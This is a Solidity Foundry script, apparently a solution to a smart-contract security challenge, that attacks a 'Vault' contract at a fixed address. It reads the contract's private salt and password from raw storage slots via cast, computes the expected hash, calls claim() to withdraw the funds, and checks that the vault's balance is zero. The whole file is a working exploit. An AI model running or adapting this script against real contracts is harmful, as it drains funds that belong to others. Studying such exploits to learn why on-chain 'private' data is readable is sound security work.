// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultAttackScript is Script {
    uint256 salt;
    uint256 hiddenPassword;

    address public constant VAULT_ADDRESS = 0x7b8040fB84993f88546B46D29899A60Ea60E6FCc;
    string public constant VAULT_ADDRESS_STR = "0x7b8040fB84993f88546B46D29899A60Ea60E6FCc";

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        string[] memory inputs = new string[](6);
        inputs[0] = "cast";
        inputs[1] = "storage";
        inputs[2] = VAULT_ADDRESS_STR;
        inputs[3] = "0"; // slot for salt
        inputs[4] = "--rpc-url";
        inputs[5] = vm.envString("RPC_URL");

        bytes memory output = vm.ffi(inputs);
        salt = abi.decode(output, (uint256));

        inputs[3] = "1"; // slot for hiddenPassword
        output = vm.ffi(inputs);
        hiddenPassword = abi.decode(output, (uint256));

        console.log("Salt:", salt);
        console.log("Hidden Password:", hiddenPassword);

        uint256 password = uint256(keccak256(abi.encode(hiddenPassword + salt)));
        console.log("Encoded Password:", password);

        Vault(payable(VAULT_ADDRESS)).claim(password);
        require(address(VAULT_ADDRESS).balance == 0, "!empty");

        vm.stopBroadcast();
    }
}
